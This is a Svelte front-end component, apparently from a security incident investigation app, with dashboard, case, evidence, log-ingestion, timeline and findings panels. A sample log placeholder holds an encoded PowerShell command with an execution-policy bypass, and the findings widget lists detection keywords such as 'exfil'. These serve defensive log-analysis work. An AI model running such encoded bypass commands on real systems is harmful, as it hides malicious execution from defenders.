              class="border border-slate-250 bg-white text-xs font-bold text-slate-700 rounded-xl px-3 py-1.5 focus:outline-none cursor-pointer max-w-xs truncate shadow-sm"
            >
              {#each cases as c}
                <option value={c.id}>
                  [{c.id.substring(5, 9).toUpperCase()}] {c.title}
                </option>
              {/each}
            </select>
          </div>
        {/if}
      </div>

      <!-- Core application navigation selectors -->
      <div class="flex items-center gap-1 bg-slate-100/85 rounded-xl p-1 border border-slate-250/50 text-xs font-semibold">
        <button
          id="tab-dashboard-select"
          onclick={() => appTab = "dashboard"}
          class="px-3.5 py-1.5 rounded-lg border-none flex items-center gap-1.5 cursor-pointer transition-all {
            appTab === 'dashboard' ? 'bg-white text-slate-900 shadow-sm font-bold' : 'text-slate-500 hover:text-slate-800 bg-transparent'
          }"
        >
          📊 Security Dashboard
        </button>
        <button
          id="tab-cases-select"
          onclick={() => appTab = "cases"}
          class="px-3.5 py-1.5 rounded-lg border-none flex items-center gap-1.5 cursor-pointer transition-all {
            appTab === 'cases' ? 'bg-white text-slate-900 shadow-sm font-bold' : 'text-slate-500 hover:text-slate-800 bg-transparent'
          }"
        >
          💼 Incidents Locker
        </button>
        <button
          id="tab-workspace-select"
          onclick={() => appTab = "workspace"}
          class="px-3.5 py-1.5 rounded-lg border-none flex items-center gap-1.5 cursor-pointer transition-all {
            appTab === 'workspace' ? 'bg-white text-slate-900 shadow-sm font-bold' : 'text-slate-500 hover:text-slate-800 bg-transparent'
          }"
        >
          🔍 Investigation Workspace
        </button>
      </div>

      <!-- Signout back to portal helper -->
      <div class="flex items-center gap-4">
        <button
          id="btn-return-portal"
          onclick={() => {
            currentView = "landing";
            triggerToast("Returned cleanly to main studio portal.", "info");
          }}
          class="text-xs font-bold text-slate-400 hover:text-slate-600 flex items-center gap-1 bg-slate-50 border border-slate-200 hover:border-slate-300 duration-150 px-3 py-1.5 rounded-lg cursor-pointer"
        >
          <LogOut class="h-3.5 w-3.5" /> Portal Intro
        </button>
      </div>
    </header>

    <!-- Main body rendering container -->
    <main class="flex-1 max-w-7xl w-full mx-auto px-6 py-6 select-text overflow-y-auto">
      {#if isStaticMode}
        <div class="mb-6 bg-amber-50/60 border border-amber-200/80 rounded-2xl p-4 flex flex-col sm:flex-row sm:items-center sm:justify-between gap-3 text-slate-800 shadow-sm animate-fade-in">
          <div class="flex items-start gap-3">
            <div class="h-9 w-9 bg-amber-100 rounded-xl flex items-center justify-center text-amber-700 flex-shrink-0 mt-0.5 animate-pulse">
              <Info class="h-5 w-5" />
            </div>
            <div>
              <h4 class="text-xs font-bold text-slate-900 flex items-center gap-2">
                Client-Side Offline Mode Active
                <span class="bg-amber-100 text-amber-800 text-[9px] font-extrabold uppercase px-1.5 py-0.5 rounded tracking-wide">Static Deployment Fallback</span>
              </h4>
              <p class="text-[11px] text-slate-600 mt-0.5 leading-relaxed">
                The Node.js/Express server backend is unreachable (standard for static hosts like GitHub Pages). All preloaded demonstration cases, parsed log timelines, notes, and uploaded evidence are now running entirely client-side inside secure browser <strong>LocalStorage</strong>!
              </p>
            </div>
          </div>
          <button
            onclick={() => {
              if (window.confirm("Do you want to reset and re-seed the local client database with original preloaded demos? Any custom local changes will be reset.")) {
                localStorage.removeItem("iris_local_db");
                fetchCasesList();
                triggerToast("Re-seeded Local Storage database cleanly!", "success");
              }
            }}
            class="text-[10px] font-bold bg-amber-100 hover:bg-amber-200/80 text-amber-900 border border-amber-250/50 px-3 py-1.5 rounded-lg flex items-center gap-1 cursor-pointer transition-colors self-start sm:self-center whitespace-nowrap"
          >
            <RefreshCw class="h-3 w-3" /> Reset / Re-Seed Demos
          </button>
        </div>
      {/if}

      {#if loadingCases}
        <div class="p-24 text-center text-slate-400 flex flex-col items-center justify-center space-y-2">
          <RefreshCw class="h-8 w-8 animate-spin text-violet-600" />
          <p class="text-xs font-bold text-slate-600">Retrieving security case channels...</p>
        </div>
      {:else}
        <!-- View Tab: Dashboard -->
        {#if appTab === "dashboard"}
          <Dashboard
            cases={cases}
            events={activeCaseDetails?.events || []}
            findings={activeCaseDetails?.findings || []}
            evidence={activeCaseDetails?.evidence || []}
            onQuickInject={handleQuickInject}
            onNavigateToCase={(caseId) => {
              activeCaseId = caseId;
              appTab = "workspace";
              workspaceSubTab = "timeline";
            }}
            onCreateCase={() => appTab = "cases"}
          />
        {/if}

        <!-- View Tab: Cases Management List -->
        {#if appTab === "cases"}
          <CasesPage
            cases={cases}
            onCreateCase={handleCreateCase}
            onEditCase={handleEditCase}
            onDeleteCase={handleDeleteCase}
            onOpenCase={(caseId) => {
              activeCaseId = caseId;
              appTab = "workspace";
              workspaceSubTab = "timeline";
            }}
          />
        {/if}

        <!-- View Tab: Investigation Workspace (Complex split layout) -->
        {#if appTab === "workspace" && activeCaseDetails}
          <div id="investigation-split-workspace" class="grid grid-cols-1 xl:grid-cols-4 gap-6">
            
            <!-- Left side parameters segment (Case Info, S3 locker evidence, ATT&CK visual) -->
            <div class="xl:col-span-1 space-y-6">
              
              <!-- Case parameters card -->
              <div class="bg-white p-5 rounded-2xl border border-slate-200 shadow-sm space-y-3.5">
                <div class="space-y-1">
                  <span class="text-[10px] uppercase font-bold tracking-wider text-slate-400 font-mono">ACTIVE SECURITY AUDIT // ID: {activeCaseDetails.id}</span>
                  <h3 class="text-sm font-bold text-slate-900 leading-tight">{activeCaseDetails.title}</h3>
                  <p class="text-xs text-slate-500 mt-1.5 leading-relaxed">{activeCaseDetails.description}</p>
                </div>

                <div class="border-t border-slate-100 pt-3 grid grid-cols-2 gap-3 text-xs">
                  <div>
                    <span class="text-[9px] uppercase font-bold text-slate-400 block mb-0.5">Threat Level</span>
                    <span class="inline-block px-2.5 py-0.5 rounded text-[10px] font-bold border {
                      activeCaseDetails.severity === 'Critical' ? 'bg-rose-50 text-rose-600 border-rose-150' :
                      activeCaseDetails.severity === 'High' ? 'bg-amber-50 text-amber-600 border-amber-150' :
                      activeCaseDetails.severity === 'Medium' ? 'bg-blue-50 text-blue-600 border-blue-150' : 'bg-slate-50 text-slate-600 border-slate-150'
                    }">
                      {activeCaseDetails.severity}
                    </span>
                  </div>
                  <div>
                    <span class="text-[9px] uppercase font-bold text-slate-400 block mb-0.5 font-sans">Investigation status</span>
                    <span class="inline-flex items-center gap-1 px-2.5 py-0.5 rounded text-[10px] font-bold border {
                      activeCaseDetails.status === 'Resolved' ? 'bg-emerald-50 text-emerald-700 border-emerald-150' :
                      activeCaseDetails.status === 'Investigating' ? 'bg-violet-50 text-violet-700 border-violet-150' : 'bg-sky-50 text-sky-700 border-sky-150'
                    }">
                      • {activeCaseDetails.status}
                    </span>
                  </div>
                </div>

                <div class="border-t border-slate-100 pt-3">
                  <label class="text-[9px] uppercase font-bold text-slate-400 block mb-1">Modify Investigation parameters</label>
                  <div class="grid grid-cols-2 gap-2 text-xs">
                    <select
                      id="workspace-change-severity"
                      value={activeCaseDetails.severity}
                      onchange={(e) => handleEditCase(activeCaseDetails!.id, { severity: (e.target as HTMLSelectElement).value as CaseSeverity })}
                      class="border border-slate-200 bg-white rounded-lg p-1"
                    >
                      <option value="Low">Low Threat</option>
                      <option value="Medium">Medium Threat</option>
                      <option value="High">High Threat</option>
                      <option value="Critical">Critical Threat</option>
                    </select>
                    <select
                      id="workspace-change-status"
                      value={activeCaseDetails.status}
                      onchange={(e) => handleEditCase(activeCaseDetails!.id, { status: (e.target as HTMLSelectElement).value as CaseStatus })}
                      class="border border-slate-200 bg-white rounded-lg p-1"
                    >
                      <option value="Open">Status: Open</option>
                      <option value="Investigating">Status: Investigating</option>
                      <option value="Resolved">Status: Resolved</option>
                    </select>
                  </div>
                </div>
              </div>

              <!-- Evidence locker component -->
              <div class="bg-white p-5 rounded-2xl border border-slate-200 shadow-sm">
                <EvidenceLocker
                  caseId={activeCaseId}
                  evidenceList={activeCaseDetails.evidence || []}
                  caseEvents={activeCaseDetails.events || []}
                  onUploadEvidence={handleUploadEvidence}
                  onRemoveEvidence={handleRemoveEvidence}
                />
              </div>

            </div>

            <!-- Center Panel (Timeline and Reporting builder tabs) -->
            <div class="xl:col-span-2 space-y-6">
              
              <!-- Attack sequence interactive visual block -->
              <AttackChain events={activeCaseDetails.events || []} />

              <!-- Core Timeline parser / Report toggler -->
              <div class="bg-white p-5 rounded-2xl border border-slate-200 shadow-sm space-y-4">
                <div class="flex bg-slate-150/70 p-1 rounded-xl border border-slate-200 max-w-[max-content] text-xs font-semibold">
                  <button
                    id="sub-tab-timeline-select"
                    onclick={() => workspaceSubTab = "timeline"}
                    class="px-4.5 py-1.5 border-none rounded-lg flex items-center gap-1.5 cursor-pointer transition-all {
                      workspaceSubTab === 'timeline' ? 'bg-white text-slate-800 shadow-sm font-bold' : 'text-slate-500 hover:text-slate-700 bg-transparent'
                    }"
                  >
                    <ClipboardList class="h-3.5 w-3.5" /> Investigation Steps
                  </button>
                  <button
                    id="sub-tab-report-select"
                    onclick={() => workspaceSubTab = "report"}
                    class="px-4.5 py-1.5 border-none rounded-lg flex items-center gap-1.5 cursor-pointer transition-all {
                      workspaceSubTab === 'report' ? 'bg-white text-slate-800 shadow-sm font-bold' : 'text-slate-500 hover:text-slate-700 bg-transparent'
                    }"
                  >
                    <FileText class="h-3.5 w-3.5" /> Intelligence Report
                  </button>
                </div>

                {#if workspaceSubTab === "timeline"}
                  <div class="space-y-6">
                    
                    <!-- Interactive drag or manual log files parses with Real-time Right vs Wrong forensics -->
                    <div class="bg-zinc-50 p-5 rounded-2xl border border-zinc-200 shadow-inner space-y-4">
                      <div class="flex items-center justify-between">
                        <div>
                          <span class="text-[10px] uppercase font-bold text-violet-700 tracking-wider block">SOC Log Ingestion & Analytics Terminal</span>
                          <span class="text-[12.5px] font-extrabold text-slate-800 block mt-0.5">Evaluate Custom Logs (Secure vs Insecure)</span>
                        </div>
                        <div class="flex bg-zinc-200/50 p-0.5 rounded-lg text-[10.5px] font-bold">
                          <button
                            type="button"
                            onclick={() => ingestionTab = "upload"}
                            class="px-2.5 py-1 rounded-md transition-all border-none cursor-pointer {
                              ingestionTab === 'upload' ? 'bg-white text-slate-800 shadow-sm' : 'text-slate-500 bg-transparent'
                            }"
                          >
                            📁 Upload File
                          </button>
                          <button
                            type="button"
                            onclick={() => ingestionTab = "paste"}
                            class="px-2.5 py-1 rounded-md transition-all border-none cursor-pointer {
                              ingestionTab === 'paste' ? 'bg-white text-slate-800 shadow-sm' : 'text-slate-500 bg-transparent'
                            }"
                          >
                            ✍️ Paste Text
                          </button>
                        </div>
                      </div>

                      {#if ingestionTab === "upload"}
                        <!-- svelte-ignore a11y_no_static_element_interactions -->
                        <div
                          id="log-dropzone"
                          ondragover={(e) => {
                            e.preventDefault();
                            uploadDragActive = true;
                          }}
                          ondragleave={() => uploadDragActive = false}
                          ondrop={(e) => {
                            e.preventDefault();
                            uploadDragActive = false;
                            if (e.dataTransfer && e.dataTransfer.files && e.dataTransfer.files[0]) {
                              const file = e.dataTransfer.files[0];
                              const reader = new FileReader();
                              reader.onload = (evt) => {
                                handleLogFileUpload(file.name, (evt.target?.result as string) || "");
                              };
                              reader.readAsText(file);
                            }
                          }}
                          class="border-2 border-dashed rounded-xl p-6 text-center transition-all relative cursor-pointer {
                            uploadDragActive ? 'border-violet-600 bg-violet-50/50' : 'border-zinc-200 bg-white hover:bg-slate-50 hover:border-zinc-300'
                          }"
                        >
                          <input
                            id="log-file-input"
                            type="file"
                            accept=".txt,.log,.json,.csv"
                            class="absolute inset-0 opacity-0 cursor-pointer"
                            onchange={(e) => {
                              const target = e.target as HTMLInputElement;
                              if (target.files && target.files[0]) {
                                const file = target.files[0];
                                const reader = new FileReader();
                                reader.onload = (evt) => {
                                  handleLogFileUpload(file.name, (evt.target?.result as string) || "");
                                };
                                reader.readAsText(file);
                              }
                            }}
                          />
                          <UploadCloud class="h-8 w-8 text-slate-400 mx-auto mb-2" />
                          <p class="text-xs font-bold text-slate-700">Drag your log file here, or click to browse</p>
                          <p class="text-[10px] text-slate-400 mt-1">Accepts standard .txt, .log, .json, and .csv data sheets</p>
                        </div>
                      {:else}
                        <form onsubmit={handleManualLogIngestSubmit} class="space-y-3">
                          <textarea
                            id="log-pasted-strings-input"
                            bind:value={interactiveLogText}
                            placeholder="Example:&#10;2026-06-22T14:45:00 USER_LOGIN_SUCCESS j.admin IP=10.12.5.40 - MFA verified (authorized check)&#10;2026-06-22T14:47:11 POWERSHELL ExecutionPolicy Bypass -enc SQBFAFg..."
                            class="w-full text-[11px] font-mono p-3 border border-zinc-200 bg-white rounded-xl focus:outline-none focus:ring-1 focus:ring-violet-500 h-24 resize-none leading-relaxed"
                          ></textarea>
                          <div class="flex items-center justify-between">
                            <span class="text-[10px] text-slate-400 max-w-xs leading-tight">Paste logs to run server-side forensics check. Results stream instantly below.</span>
                            <button
                              id="btn-manual-log-parse-submit"
                              type="submit"
                              class="px-4.5 py-2 bg-violet-600 hover:bg-violet-700 text-white border-none rounded-xl text-xs font-bold transition-all shadow-sm cursor-pointer"
                            >
                              Identify Milestones
                            </button>
                          </div>
                        </form>
                      {/if}

                      <!-- Beautiful Forensics Analytics Verdict Report Card (What went Right vs Wrong) -->
                      {#if lastParsedReport}
                        <div class="bg-white border border-zinc-200 p-4.5 rounded-xl space-y-4 shadow-sm animate-fade-in">
                          <div class="flex items-center justify-between border-b border-zinc-100 pb-2.5">
                            <div class="space-y-0.5">
                              <div class="flex items-center gap-2">
                                <span class="text-[10px] bg-indigo-50 text-indigo-700 border border-indigo-100 px-2.5 py-0.5 rounded-full font-bold">
                                  Forensic Check Complete
                                </span>
                                <span class="text-[11px] font-mono text-slate-500 font-semibold truncate max-w-[150px]">
                                  {lastParsedReport.fileName}
                                </span>
                              </div>
                              <p class="text-[11.5px] font-mono text-slate-400">Processed {lastParsedReport.totalLines} custom sequence records.</p>
                            </div>
                            <button
                              type="button"
                              onclick={() => lastParsedReport = null}
                              class="p-1.5 text-slate-400 hover:text-slate-600 hover:bg-slate-100 rounded-full border-none bg-transparent transition-colors cursor-pointer"
                              title="Dismiss Report"
                            >
                              <X class="h-4.5 w-4.5" />
                            </button>
                          </div>

                          <!-- Risk metrics dial summary -->
                          <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                            <!-- WHAT WENT RIGHT (Green Card) -->
                            <div class="bg-emerald-50/50 border border-emerald-100 rounded-xl p-3.5 space-y-2">
                              <div class="flex items-center justify-between">
                                <div class="flex items-center gap-1.5">
                                  <div class="h-5.5 w-5.5 rounded-full bg-emerald-100 border border-emerald-200 flex items-center justify-center text-emerald-700 text-xs font-bold">✓</div>
                                  <span class="text-xs font-extrabold text-emerald-950 uppercase tracking-wider">What Went Right</span>
                                </div>
                                <span class="text-[11px] font-mono bg-emerald-100/60 text-emerald-800 border border-emerald-200 px-2 py-0.5 rounded font-bold">
                                  {lastParsedReport.compliantCount} Verified Safe
                                </span>
                              </div>
                              <p class="text-[10.5px] text-emerald-800 leading-relaxed">
                                The following actions match secure system baselines, policy-compliant logins, and general standard system operations:
                              </p>
                              <div class="space-y-1.5 max-h-40 overflow-y-auto font-mono text-[9px] pr-1">
                                {#if lastParsedReport.events.filter(e => !e.isSuspicious).length === 0}
                                  <p class="text-slate-400 italic py-1">No compliant actions extracted in log segment.</p>
                                {:else}
                                  {#each lastParsedReport.events.filter(e => !e.isSuspicious) as e}
                                    <div class="bg-white/80 p-1.5 rounded border border-emerald-100 text-emerald-900 leading-tight">
                                      <div class="font-bold flex justify-between">
                                        <span>[RIGHT] {e.event}</span>
                                        <span class="text-[8px] text-slate-400">{(e.timestamp || "").substring(11, 19)}</span>
                                      </div>
                                      <p class="text-[8.5px] mt-0.5 text-slate-600 line-clamp-2">{e.description}</p>
                                    </div>
                                  {/each}
                                {/if}
                              </div>
                            </div>

                            <!-- WHAT WENT WRONG (Red Card) -->
                            <div class="bg-rose-50/50 border border-rose-100 rounded-xl p-3.5 space-y-2">
                              <div class="flex items-center justify-between">
                                <div class="flex items-center gap-1.5">
                                  <div class="h-5.5 w-5.5 rounded-full bg-rose-100 border border-rose-200 flex items-center justify-center text-rose-700 text-xs font-bold">✖</div>
                                  <span class="text-xs font-extrabold text-rose-950 uppercase tracking-wider">What Went Wrong</span>
                                </div>
                                <span class="text-[11px] font-mono bg-rose-100/60 text-rose-800 border border-rose-200 px-2 py-0.5 rounded font-bold">
                                  {lastParsedReport.threatsCount} Alerts Flagged
                                </span>
                              </div>
                              <p class="text-[10.5px] text-rose-800 leading-relaxed">
                                These activities triggered high-severity alarms, suspicious command flags, credential dump checks, or data leak patterns:
                              </p>
                              <div class="space-y-1.5 max-h-40 overflow-y-auto font-mono text-[9px] pr-1">
                                {#if lastParsedReport.events.filter(e => e.isSuspicious).length === 0}
                                  <p class="text-emerald-700 italic py-1 font-semibold">✔ Congratulations, zero threat vectors flagged from this source file!</p>
                                {:else}
                                  {#each lastParsedReport.events.filter(e => e.isSuspicious) as e}
                                    <div class="bg-white/90 p-1.5 rounded border border-rose-100 text-rose-900 leading-tight">
                                      <div class="font-bold flex justify-between text-rose-800">
                                        <span>[WRONG] {e.event}</span>
                                        <span class="text-[8px] text-slate-400">{(e.timestamp || "").substring(11, 19)}</span>
                                      </div>
                                      <p class="text-[8.5px] mt-0.5 text-slate-600 line-clamp-2">{e.description}</p>
                                      {#if e.techniqueId}
                                        <span class="inline-block mt-1 text-[7.5px] px-1 py-0.2 bg-red-50 text-red-700 rounded border border-red-200">
                                          MITRE: {e.techniqueId} - {e.techniqueName}
                                        </span>
                                      {/if}
                                    </div>
                                  {/each}
                                {/if}
                              </div>
                            </div>
                          </div>
                        </div>
                      {/if}
                    </div>

                    <TimelineBuilder
                      caseId={activeCaseId}
                      events={activeCaseDetails.events || []}
                      onAddTimelineEvent={handleAddTimelineEvent}
                      onDeleteTimelineEvent={handleDeleteTimelineEvent}
                      onReorderTimeline={handleReorderTimeline}
                    />
                  </div>
                {:else}
                  <ReportSystem
                    caseId={activeCaseId}
                    activeCase={activeCaseDetails}
                    caseEvents={activeCaseDetails.events || []}
                    caseFindings={activeCaseDetails.findings || []}
                    caseEvidence={activeCaseDetails.evidence || []}
                    isStaticMode={isStaticMode}
                  />
                {/if}
              </div>

            </div>

            <!-- Right Panel (Notepad editor and Auto-findings report) -->
            <div class="xl:col-span-1 space-y-6">
              
              <!-- Notes template editor -->
              <div class="bg-white p-5 rounded-2xl border border-slate-200 shadow-sm">
                <NotesEditor
                  caseId={activeCaseId}
                  notes={activeCaseDetails.notes}
                  caseEvents={activeCaseDetails.events || []}
                  onSaveNotes={handleSaveNotes}
                />
              </div>

              <!-- Real-time Findings audit widget -->
              <div class="bg-white p-5 rounded-2xl border border-slate-200 shadow-sm space-y-3">
                <div class="border-b border-slate-100 pb-2">
                  <h4 class="text-[12px] uppercase tracking-wider font-extrabold text-slate-400 flex items-center gap-1.5">
                    🛡️ Real-Time Findings Heuristics
                  </h4>
                  <p class="text-[10px] text-slate-400 inline mt-1 block leading-relaxed">
                    Automatic heuristic scan identifies threat patterns internally during log uploads.
                  </p>
                </div>

                <div id="findings-checklist" class="space-y-2.5 max-h-60 overflow-y-auto pr-1">
                  {#if activeCaseDetails.findings.length === 0}
                    <div class="text-center py-6 text-slate-400 border border-slate-100 rounded-xl bg-slate-50/50">
                      <p class="text-[10.5px] font-semibold">Heuristics scan complete. Zero alerts triggered.</p>
                      <p class="text-[9.5px] text-slate-400 mt-0.5">Heuristics evaluate terms such as 'powershell', 'exfil', 'failed'.</p>
                    </div>
                  {:else}
                    {#each activeCaseDetails.findings as f}
                      <div
                        class="bg-zinc-50 p-3 rounded-xl border border-slate-250 flex items-start gap-2.5 text-xs hover:border-slate-350 transition-colors animate-fade-in"
                      >
                        <div class="h-5.5 w-5.5 bg-rose-50 text-rose-600 rounded flex items-center justify-center font-extrabold flex-shrink-0 text-[10px] mt-0.5 border border-rose-100">
                          ⚠️
                        </div>
                        <div class="space-y-1 flex-1">
                          <p class="font-bold text-slate-800 leading-tight">{f.title}</p>
                          <p class="text-[10.5px] text-slate-600 leading-relaxed font-sans">{f.description}</p>
                          
                          <p class="text-[10px] text-amber-700 italic leading-relaxed pt-0.5 font-semibold">Reason: {f.reason}</p>
                          
                          <div class="flex items-center gap-1.5 pt-1.5 font-mono text-[9.5px] font-bold text-slate-500">
                            <span>Confidence: {f.confidence}%</span>
                            <span>•</span>
                            <span class="text-rose-600 uppercase">{f.severity}</span>
                          </div>
                        </div>
                      </div>
                    {/each}
                  {/if}
                </div>
              </div>

            </div>

          </div>
        {/if}
      {/if}
    </main>
  </div>
{/if}
